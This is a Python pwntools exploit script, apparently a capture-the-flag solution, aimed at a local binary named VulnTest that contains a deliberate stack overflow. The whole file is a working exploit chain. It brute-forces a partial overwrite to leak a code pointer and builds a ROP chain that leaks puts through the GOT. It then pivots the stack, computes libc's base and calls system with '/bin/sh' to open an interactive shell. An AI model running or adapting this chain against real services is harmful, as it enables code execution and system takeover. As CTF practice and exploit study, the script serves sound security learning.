from pwn import *

def conn():
    r = process(['./VulnTest'])

    r.recvuntil('>>')
    r.sendline('2')
    sp = -320
    # write rbx 1 byte
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('>>')
    r.sendline('1')
    r.sendline(str(sp + 0x78 + 8))
    r.recvuntil('There is a stack overflow!')
    r.send('\x18\x00')

    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('There is your note:\n')
    d = r.recvuntil('\n', drop=True)
    print(hexdump(d))
    if len(d) != 6 or d[0] != '\x15':
        r.close()
        return None, d
    return r, d

r = None
while r is None:
    r, d = conn()

ptr = u64(d.ljust(8, '\x00'))
print(hex(ptr))
text_base = ptr - 0x7a15

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('>>')
r.sendline('1')
r.sendline(str(0x20))
r.recvuntil('There is a stack overflow!')
main = text_base + 0x6FEC + 1
r.sendline(p64(main).rstrip('\x00'))

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('>>')
r.sendline('1')
r.sendline(str(-192 + 0x28))
r.recvuntil('There is a stack overflow!')
g = text_base + 0x73C8
r.sendline(p64(g).rstrip('\x00'))

read = text_base + 0x4640
scanf = text_base + 0x45D0
puts = text_base + 0x4770
puts_got = text_base + 0x20DF88
pop_rdi = text_base + 0x8f03
pop_rsi_r15 = text_base + 0x8f01
set_edx_xx = text_base + 0x8cae
ret = text_base + 0x74F5

rop_addr = 0x623000000100 + 0x180 * 8
cmd = '/bin/sh\x00'
rop = ''.join(map(p64, [0xdddd] * 0x180 + [0xbbbb,
    pop_rdi, puts_got, puts,
    pop_rdi, 0, pop_rsi_r15, rop_addr + 0x70, 0x1515, set_edx_xx, read,
    pop_rdi, rop_addr + 0x78, ret, 0xdeaddead]))
rop += cmd
rop = rop.ljust(0x1800)

r.recvuntil('>>')
r.sendline('1')
r.recvuntil('key:')
r.sendline('x')
r.recvuntil('size:')
r.sendline(str(len(rop)))
r.recvuntil('content:')
r.send(rop)
r.recvuntil('Success')
r.sendline('5')

for i, c in enumerate(p64(rop_addr).replace('\x00', '\n')):
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('>>')
    r.sendline('1')
    r.sendline(str(-192 + 0x20 + i))
    r.recvuntil('There is a stack overflow!')
    if c == '\n':
        r.send(c)
    else:
        r.sendline(c + '\n')

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('>>')
r.sendline('1')
r.sendline(str(-192 + 0x28))
r.recvuntil('There is a stack overflow!\n')
leave = text_base + 0x4ab6
r.sendline(p64(leave).rstrip('\x00'))

d = r.recvuntil('\n', drop=True).ljust(8, '\x00')
puts = u64(d)
print(hex(puts))
libc_base = puts - 0x809c0
system = libc_base + 0x4f440
print(hex(libc_base))
r.send(p64(system))

r.interactive()
